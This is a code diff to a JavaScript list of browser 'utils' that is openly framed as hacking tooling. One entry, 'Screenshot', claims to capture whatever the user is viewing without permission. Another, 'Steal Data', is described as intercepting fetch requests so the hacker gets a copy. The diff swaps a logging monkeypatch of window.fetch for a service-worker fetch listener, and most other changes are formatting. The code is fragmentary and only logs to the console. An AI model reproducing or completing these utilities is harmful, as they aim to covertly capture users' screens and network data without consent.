@@ -30,10 +30,10 @@ const utils = [
     name: "Screenshot",
     description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
     func: () => {
-      document.addEventListener('DOMContentLoaded', function() {
+      document.addEventListener('DOMContentLoaded', function () {
         // your code here
-     }, false);
-     
+      }, false);
+
       html2canvas(document.body, {
         allowTaint: true,
         useCORS: true,
@@ -89,14 +89,11 @@ const utils = [
     name: "Steal Data",
     description: "Intercepts network fetch requests and gets a copy of the data to the hacker",
     func: () => {
-      const fetch = window.fetch;
-      console.log(document.fetch);
-      window.fetch = (...args) => (async(args) => {
-      console.log(...args);
-      var result = await fetch(...args);
-      console.log(result); // intercept response here
-      return result;
-      })(args);
+
+      self.addEventListener('fetch', function(event) {
+        console.log(event);
+      })
+
     }
   }
 ]
